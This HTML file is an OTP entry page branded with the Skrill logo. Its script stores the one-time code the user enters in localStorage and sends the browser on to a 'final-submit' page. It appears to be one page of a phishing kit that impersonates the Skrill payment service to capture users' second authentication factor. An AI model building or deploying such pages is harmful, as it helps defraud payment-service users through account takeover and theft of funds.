<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>OTP Verification</title>
</head>
<body>
    <div class="otp-container">
        <form id="otp-form">
            <!-- Add this line in the <body> section of each HTML file where you want the logo -->
<div class="logo">
    <img src="Skrill.png" alt="Skrill Logo">
</div>

            <h2>Enter OTP</h2>
            <div class="input-group">
                <label for="otp">OTP Code</label>
                <input type="text" id="otp" name="otp" required>
            </div>
            <button type="submit" class="otp-btn">Verify OTP</button>
        </form>
    </div>
    <script>
        document.getElementById('otp-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            // Get OTP value and store it in local storage
            var otp = document.getElementById('otp').value;
            localStorage.setItem('userOTP', otp);

            // Redirect to final submit page
            window.location.href = 'final-submit.html';
        });
    </script>
</body>
</html>
